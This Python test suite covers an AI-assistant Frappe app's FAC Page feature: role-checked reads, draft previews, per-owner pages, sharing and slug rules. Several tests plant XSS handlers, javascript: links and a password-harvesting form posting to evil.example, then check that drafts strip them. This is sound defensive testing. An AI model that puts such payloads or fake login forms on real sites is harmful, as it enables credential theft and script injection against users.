# Frappe Assistant Core - AI Assistant integration for Frappe Framework
# Copyright (C) 2025 Paul Clinton
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""FAC Page records, the role-checked read endpoint and the host Desk page."""

import glob
import hashlib
import json
import os

import frappe
from frappe.client import delete, set_value
from frappe.share import add as share_with

from frappe_assistant_core.api.fac_page import get_page
from frappe_assistant_core.plugins.core.tools.create_document import DocumentCreate
from frappe_assistant_core.plugins.core.tools.get_document import DocumentGet
from frappe_assistant_core.plugins.core.tools.list_documents import DocumentList
from frappe_assistant_core.tests.base_test import BaseAssistantTest

HOST_PAGE = "fac-pages"


def _app_records(kind: str) -> set:
    """Names of the standard DocTypes or Pages this app ships, read from their JSON."""
    names = set()
    for module in frappe.get_module_list("frappe_assistant_core"):
        module_path = frappe.get_app_path("frappe_assistant_core", frappe.scrub(module))
        for path in glob.glob(os.path.join(module_path, kind, "*", "*.json")):
            with open(path) as f:
                record = json.load(f)
            if record.get("doctype") == ("DocType" if kind == "doctype" else "Page"):
                names.add(record["name"])
    return names


class TestFACPage(BaseAssistantTest):
    def _make_page(self, published: int = 1, roles: tuple = (), **overrides) -> str:
        slug = overrides.pop("slug", f"test-page-{frappe.generate_hash(length=8).lower()}")
        doc = frappe.get_doc(
            {
                "doctype": "FAC Page",
                "title": "Team Planner",
                "slug": slug,
                "visibility": "Shared",
                "published": published,
                "roles": [{"role": role} for role in roles],
                "html": '<div class="mk-card">Plan</div>',
                "script": "root_element.querySelector('.mk-card').dataset.ready = '1';",
                "style": ".mk-card { color: red; }",
                **overrides,
            }
        )
        doc.insert(ignore_permissions=True)
        return doc.name

    def _act_as(self, prefix: str, roles: tuple = ()) -> None:
        # Production reaches get_page as the logged-in Desk user; these are such users with exactly
        # the roles the case needs, rolled back with the test transaction.
        user = self.make_throwaway_user(prefix, roles=roles)
        # nosemgrep: frappe-setuser — test acts as a non-Administrator inside the test transaction
        frappe.set_user(user)

    def test_a_listed_role_reads_the_page(self):
        slug = self._make_page(roles=("Report Manager",))
        self._act_as("fac-page-reader", roles=("Report Manager",))

        page = get_page(slug)

        self.assertEqual(page["title"], "Team Planner")
        self.assertEqual(page["html"], '<div class="mk-card">Plan</div>')
        self.assertIn("dataset.ready", page["script"])
        self.assertEqual(page["style"], ".mk-card { color: red; }")

    def test_a_user_without_a_listed_role_is_refused(self):
        slug = self._make_page(roles=("Report Manager",))
        self._act_as("fac-page-outsider", roles=("Workspace Manager",))

        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

    def test_no_roles_means_system_manager_only(self):
        slug = self._make_page(roles=())
        self._act_as("fac-page-no-roles", roles=("Report Manager",))
        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

        self._act_as("fac-page-sysman", roles=("System Manager",))
        self.assertEqual(get_page(slug)["title"], "Team Planner")

    def test_an_unpublished_page_does_not_exist_for_others(self):
        slug = self._make_page(published=0, roles=("Report Manager",))
        self._act_as("fac-page-draft-reader", roles=("Report Manager",))

        with self.assertRaises(frappe.DoesNotExistError) as caught:
            get_page(slug)
        self.assertNotIn("permission", str(caught.exception).lower())

    def test_a_system_manager_reads_an_unpublished_page(self):
        slug = self._make_page(published=0)
        self._act_as("fac-page-draft-sysman", roles=("System Manager",))

        self.assertEqual(get_page(slug)["html"], '<div class="mk-card">Plan</div>')

    def test_a_draft_is_served_without_its_script(self):
        # A draft is dormant, so previewing it must run no code: the script waits for publishing.
        slug = self._make_page(published=0)
        self._act_as("fac-page-draft-preview", roles=("System Manager",))

        page = get_page(slug)

        self.assertEqual(page["script"], "")
        self.assertTrue(page["draft"])
        self.assertEqual(page["html"], '<div class="mk-card">Plan</div>')
        self.assertEqual(page["style"], ".mk-card { color: red; }")

    def test_a_draft_is_served_without_inline_handlers(self):
        # create_shadow_element strips only <script> and <style>, so a draft's html must not carry
        # handlers or javascript: links that would run code in the previewer's session.
        html = (
            '<div class="mk-card">Plan<img src="x" onerror="alert(1)">'
            '<a href="javascript:alert(1)">go</a><meta http-equiv="refresh" content="0"></div>'
        )
        slug = self._make_page(published=0, html=html)
        self._act_as("fac-page-draft-handlers", roles=("System Manager",))

        served = get_page(slug)["html"]

        for unsafe in ("onerror", "javascript:", "<meta", "alert(1)"):
            self.assertNotIn(unsafe, served)
        self.assertIn('class="mk-card"', served)

    def test_a_draft_is_served_without_form_controls(self):
        # Defence in depth behind the sandboxed preview: no fake prompt that posts elsewhere.
        html = (
            '<div class="mk-card"><form action="https://evil.example/steal">'
            '<input type="password" name="p"><select><option>a</option></select>'
            "<textarea></textarea><button>Sign in</button></form></div>"
        )
        slug = self._make_page(published=0, html=html)
        self._act_as("fac-page-draft-form", roles=("System Manager",))

        served = get_page(slug)["html"]

        for tag in ("<form", "<input", "<button", "<select", "<textarea"):
            self.assertNotIn(tag, served)
        self.assertIn('class="mk-card"', served)

    def test_a_draft_link_cannot_navigate(self):
        # A clicked link would navigate the sandboxed preview to a remote page.
        html = (
            '<a class="mk-link" href="https://evil.example/x" target="_top">Go</a>'
            '<map><area href="https://evil.example/y"></map><a class="mk-anchor">Plain</a>'
            '<svg><a xlink:href="https://evil.example/z"><text>Svg</text></a></svg>'
        )
        slug = self._make_page(published=0, html=html)
        self._act_as("fac-page-draft-link", roles=("System Manager",))

        served = get_page(slug)["html"]

        for unsafe in ("href", "evil.example", "target"):
            self.assertNotIn(unsafe, served)
        self.assertIn('class="mk-link"', served)
        self.assertIn(">Plain</a>", served)
        self.assertIn(">Go</a>", served)

    def test_the_host_page_inlines_the_draft_preview(self):
        # Desk loads the page script through Page.load_assets, which resolves the include.
        page = frappe.get_doc("Page", HOST_PAGE)
        page.load_assets()

        self.assertIn("function fac_page_draft_frame", page.script)
        self.assertIn('frame.setAttribute("sandbox", "")', page.script)
        self.assertNotIn("{% include", page.script)

    def test_a_published_page_html_is_served_unchanged(self):
        html = '<div class="mk-card" onclick="go()"><img src="x" onerror="track()"></div>'
        slug = self._make_page(published=1, html=html)
        self._act_as("fac-page-published-html", roles=("System Manager",))

        self.assertEqual(get_page(slug)["html"], html)

    def test_a_published_page_is_served_with_its_script(self):
        slug = self._make_page(published=1)
        self._act_as("fac-page-published-sysman", roles=("System Manager",))

        page = get_page(slug)

        self.assertIn("dataset.ready", page["script"])
        self.assertFalse(page["draft"])

    def test_a_missing_page_does_not_exist(self):
        self._act_as("fac-page-missing", roles=("System Manager",))

        with self.assertRaises(frappe.DoesNotExistError):
            get_page("no-such-page")

    def test_guest_is_refused(self):
        slug = self._make_page(roles=("Guest",))
        # nosemgrep: frappe-setuser — an anonymous request runs as Guest
        frappe.set_user("Guest")

        with self.assertRaises(frappe.PermissionError):
            get_page(slug)

    def test_bad_slugs_are_refused(self):
        for slug in ("Team Planner", "a--b", "-x", "x-", "a" * 81):
            with self.subTest(slug=slug), self.assertRaises(frappe.ValidationError):
                self._make_page(slug=slug)

    def test_page_roles_never_reach_has_role(self):
        # Frappe's Page, Report and Custom HTML Block checks read Has Role by parent name
        # alone, so a Has Role row named after the slug would widen access to any of them.
        slug = self._make_page(roles=("Report Manager",))

        self.assertFalse(frappe.db.exists("Has Role", {"parent": slug}))

    def test_a_long_slug_up_to_the_limit_is_kept(self):
        self.assertEqual(self._make_page(slug="a" * 80), "a" * 80)

    def test_the_slug_cannot_change_after_save(self):
        # The slug names the record, so a changed slug would leave get_page serving the old URL.
        doc = frappe.get_doc("FAC Page", self._make_page())
        doc.slug = "renamed-page"

        with self.assertRaises(frappe.ValidationError):
            doc.save(ignore_permissions=True)

    def test_a_duplicate_slug_is_refused(self):
        self._make_page(slug="team-planner-dup")

        with self.assertRaises(frappe.DuplicateEntryError):
            self._make_page(slug="team-planner-dup")

    def test_the_host_page_is_installed(self):
        self.assertTrue(frappe.db.exists("Page", HOST_PAGE))

    def test_no_desk_page_shares_a_doctype_route(self):
        # Desk resolves /app/<segment> to a readable DocType before any Page, by
        # frappe.router.slug (lower-case, spaces to hyphens), so a Page named like
        # a DocType's slug is unreachable for anyone who can read that DocType.
        doctype_routes = {name.lower().replace(" ", "-") for name in _app_records("doctype")}

        self.assertIn(HOST_PAGE, _app_records("page"))
        self.assertEqual(doctype_routes & _app_records("page"), set())

    def test_a_shared_page_is_named_by_its_slug(self):
        self.assertEqual(self._make_page(slug="team-planner-shared"), "team-planner-shared")

    def test_only_system_manager_has_full_doctype_permissions(self):
        # Other Desk users reach FAC Page only through the Desk User row, for pages they own.
        perms = {perm.role: perm for perm in frappe.get_meta("FAC Page").permissions}

        self.assertEqual(set(perms), {"System Manager", "Desk User"})
        self.assertFalse(perms["System Manager"].if_owner)
        self.assertTrue(perms["Desk User"].if_owner)


def _owner_tag(user: str) -> str:
    return hashlib.sha1(user.encode()).hexdigest()[:6]


class TestPersonalFACPage(BaseAssistantTest):
    """A page anyone at the Desk can build, which opens only for the user who built it."""

    def _desk_user(self, prefix: str, roles: tuple = ("Report Manager",)) -> str:
        # Production: a Desk (System) user with an ordinary role builds the page through FACO.
        user = self.make_throwaway_user(prefix, roles=roles)
        self.assertEqual(frappe.db.get_value("User", user, "user_type"), "System User")
        return user

    def _act_as(self, user: str) -> None:
        # nosemgrep: frappe-setuser — test acts as a non-Administrator inside the test transaction
        frappe.set_user(user)

    def _build(self, user: str, slug: str = "my-planner", **overrides) -> str:
        # Production: FACO's create_document builds a new doc and calls insert() as the session
        # user, with permissions checked; this is the same call.
        self._act_as(user)
        doc = frappe.get_doc(
            {
                "doctype": "FAC Page",
                "title": "My Planner",
                "slug": slug,
                "html": '<div class="mk-card">Mine</div>',
                "script": "root_element.querySelector('.mk-card').dataset.ready = '1';",
                **overrides,
            }
        )
        doc.insert()
        return doc.name

    def _share(self, name: str) -> None:
        # Production: a System Manager opens the user's page in Desk and sets it to Shared.
        self._act_as("Administrator")
        doc = frappe.get_doc("FAC Page", name)
        doc.visibility = "Shared"
        doc.save()

    def test_a_system_user_builds_a_page_only_they_open(self):
        user = self._desk_user("fac-page-builder")

        name = self._build(user, slug="my-planner")

        self.assertEqual(name, f"my-planner-{_owner_tag(user)}")
        page = get_page(name)
        self.assertIn("dataset.ready", page["script"])
        self.assertFalse(page["draft"])
        self.assertEqual(page["visibility"], "Only me")
        self.assertTrue(page["owner_is_me"])

    def test_two_users_build_pages_with_the_same_slug(self):
        first = self._build(self._desk_user("fac-page-first"), slug="team-board")
        second = self._build(self._desk_user("fac-page-second"), slug="team-board")

        self.assertNotEqual(first, second)
        self.assertEqual(frappe.db.get_value("FAC Page", second, "slug"), "team-board")

    def test_the_owner_edits_their_page(self):
        user = self._desk_user("fac-page-editor")
        doc = frappe.get_doc("FAC Page", self._build(user))

        doc.html = "<p>Edited</p>"
        doc.save()

        self.assertEqual(get_page(doc.name)["html"], "<p>Edited</p>")

    def test_a_personal_page_does_not_exist_for_anyone_else(self):
        name = self._build(self._desk_user("fac-page-private"))

        for other in (
            self._desk_user("fac-page-sysman", roles=("System Manager",)),
            "Administrator",
            self._desk_user("fac-page-peer"),
        ):
            with self.subTest(user=other):
                self._act_as(other)
                with self.assertRaises(frappe.DoesNotExistError):
                    get_page(name)

    def test_a_system_user_cannot_share_publish_or_set_roles(self):
        user = self._desk_user("fac-page-limited")
        for i, overrides in enumerate(({"published": 1}, {"roles": [{"role": "Report Manager"}]})):
            with self.subTest(overrides=overrides), self.assertRaises(frappe.ValidationError):
                self._build(user, slug=f"limited-{i}", **overrides)

        # The permission hook refuses a shared page first; validate refuses it for a write path
        # that skips the permission check, such as server code acting for the user.
        with self.assertRaises(frappe.PermissionError):
            self._build(user, slug="limited-shared", visibility="Shared")
        doc = frappe.get_doc("FAC Page", self._build(user, slug="limited-own"))
        doc.visibility = "Shared"
        with self.assertRaises(frappe.PermissionError):
            doc.save()
        with self.assertRaises(frappe.ValidationError):
            doc.save(ignore_permissions=True)

    def test_a_system_user_cannot_edit_their_page_once_shared(self):
        user = self._desk_user("fac-page-was-mine")
        name = self._build(user)
        self._share(name)
        self._act_as(user)
        doc = frappe.get_doc("FAC Page", name)
        doc.html = "<p>Changed</p>"

        with self.assertRaises(frappe.PermissionError):
            doc.save()
        # A write path that skips the permission check, such as server code acting for the
        # user, still meets the rule in validate.
        with self.assertRaises(frappe.ValidationError):
            doc.save(ignore_permissions=True)

    def test_a_peer_given_a_share_cannot_change_the_page(self):
        # A changed script would run in the owner's session the next time they open the page.
        owner = self._desk_user("fac-page-shared-owner")
        name = self._build(owner, slug="shared-with-peer")
        # The class shares one transaction; an everyone-share would widen later tests' lists.
        self.addCleanup(frappe.db.delete, "DocShare", {"share_doctype": "FAC Page", "share_name": name})
        peer = self._desk_user("fac-page-share-peer")
        for share in ({"user": peer}, {"everyone": 1}):
            with self.subTest(share=share):
                # Production: an Administrator uses Desk's Share sidebar, which no FAC Page
                # permission row allows anyone else to do.
                self._act_as("Administrator")
                share_with("FAC Page", name, read=1, write=1, **share)
                self._act_as(peer)
                with self.assertRaises(frappe.ValidationError):
                    set_value("FAC Page", name, "script", "alert('peer')")
        self._act_as(owner)
        self.assertIn("dataset.ready", get_page(name)["script"])

    def test_no_one_but_the_administrator_can_share_a_page(self):
        name = self._build(self._desk_user("fac-page-unshareable"))
        self._act_as(self._desk_user("fac-page-share-sysman", roles=("System Manager",)))

        with self.assertRaises(frappe.PermissionError):
            share_with("FAC Page", name, user="Administrator")

    def test_a_system_user_cannot_set_value_their_page_to_shared(self):
        user = self._desk_user("fac-page-set-value")
        name = self._build(user)

        with self.assertRaises(frappe.PermissionError):
            set_value("FAC Page", name, "visibility", "Shared")
        self.assertEqual(frappe.db.get_value("FAC Page", name, "visibility"), "Only me")

    def test_the_former_owner_cannot_delete_a_shared_page(self):
        user = self._desk_user("fac-page-delete")
        name = self._build(user, slug="former-owner-board")
        self._share(name)
        self._act_as(user)

        with self.assertRaises(frappe.PermissionError):
            delete("FAC Page", name)
        self.assertTrue(frappe.db.exists("FAC Page", name))

    def test_a_website_user_cannot_build_a_page(self):
        # make_throwaway_user with no roles is a Website User, as a portal signup is. Desk User is
        # never theirs, so Frappe refuses the create; validate refuses it on any other path.
        user = self.make_throwaway_user("fac-page-website")

        with self.assertRaises(frappe.PermissionError):
            self._build(user, slug="portal-page")
        doc = frappe.get_doc({"doctype": "FAC Page", "title": "Portal", "slug": "portal-page"})
        with self.assertRaises(frappe.ValidationError):
            doc.insert(ignore_permissions=True)

    def test_the_owner_cannot_hand_the_page_to_someone_else(self):
        # Handing a page with a script to an admin would run that script in the admin's session.
        # The permission hook refuses it, and Frappe keeps owner set-once for any other save.
        user = self._desk_user("fac-page-giver")
        doc = frappe.get_doc("FAC Page", self._build(user))
        doc.owner = "Administrator"

        with self.assertRaises(frappe.PermissionError):
            doc.save()
        with self.assertRaises(frappe.ValidationError):
            doc.save(ignore_permissions=True)

    def test_a_shared_slug_stays_unique_after_a_page_is_shared(self):
        # A shared page keeps the name it was built with, so the primary key alone misses this.
        name = self._build(self._desk_user("fac-page-shared-slug"), slug="ops-board")
        self._share(name)

        with self.assertRaises(frappe.DuplicateEntryError):
            frappe.get_doc(
                {"doctype": "FAC Page", "title": "Ops", "slug": "ops-board", "visibility": "Shared"}
            ).insert()

    def test_a_personal_slug_is_unique_per_owner(self):
        # Production: a System Manager sets a shared page back to Only me; it keeps its slug-only
        # name, so a second personal page with that slug would get a different name.
        self._act_as("Administrator")
        frappe.get_doc(
            {"doctype": "FAC Page", "title": "Desk", "slug": "desk-board", "visibility": "Shared"}
        ).insert()
        doc = frappe.get_doc("FAC Page", "desk-board")
        doc.visibility = "Only me"
        doc.save()

        with self.assertRaises(frappe.DuplicateEntryError):
            self._build("Administrator", slug="desk-board")

    def test_list_documents_shows_a_system_user_only_their_pages(self):
        user = self._desk_user("fac-page-lister")
        mine = self._build(user, slug="list-mine")
        # The Desk User row's if_owner lets a user's own page through; once shared, it must drop out.
        self._share(self._build(user, slug="list-mine-shared"))
        self._build(self._desk_user("fac-page-other-lister"), slug="list-theirs")
        self._act_as("Administrator")
        frappe.get_doc(
            {"doctype": "FAC Page", "title": "Shared", "slug": "list-shared", "visibility": "Shared"}
        ).insert()
        self._act_as(user)

        result = DocumentList().execute({"doctype": "FAC Page", "fields": ["name"], "limit": 100})

        self.assertTrue(result.get("success"), result)
        self.assertEqual([row["name"] for row in result["data"]], [mine])

    def test_list_documents_shows_a_system_manager_shared_pages_and_their_own(self):
        # Someone else's personal page is listed nowhere, though the form still opens it by name.
        peer_page = self._build(self._desk_user("fac-page-list-peer"), slug="peer-board")
        sysman = self._desk_user("fac-page-list-sysman", roles=("System Manager",))
        own = self._build(sysman, slug="sysman-board")
        shared = frappe.get_doc(
            {"doctype": "FAC Page", "title": "Shared", "slug": "sysman-shared", "visibility": "Shared"}
        ).insert()

        result = DocumentList().execute({"doctype": "FAC Page", "fields": ["name"], "limit": 500})

        names = {row["name"] for row in result["data"]}
        self.assertTrue({own, shared.name} <= names, result)
        self.assertNotIn(peer_page, names)
        self.assertTrue(DocumentGet().execute({"doctype": "FAC Page", "name": peer_page}).get("success"))

    def test_get_document_reads_a_personal_page_only_for_its_owner_or_a_system_manager(self):
        # A System Manager may read the record as data, as in the Desk form; get_page, which
        # renders it, still refuses them (see above).
        name = self._build(self._desk_user("fac-page-get"))

        self._act_as(self._desk_user("fac-page-get-peer"))
        self.assertFalse(DocumentGet().execute({"doctype": "FAC Page", "name": name}).get("success"))

        self._act_as(self._desk_user("fac-page-get-sysman", roles=("System Manager",)))
        self.assertTrue(DocumentGet().execute({"doctype": "FAC Page", "name": name}).get("success"))

    def test_a_system_user_builds_a_page_through_create_document(self):
        user = self._desk_user("fac-page-tool-builder")
        self._act_as(user)

        result = DocumentCreate().execute(
            {"doctype": "FAC Page", "data": {"title": "Tool", "slug": "tool-page", "html": "<p>x</p>"}}
        )

        self.assertTrue(result.get("success"), result)
        self.assertEqual(result["name"], f"tool-page-{_owner_tag(user)}")
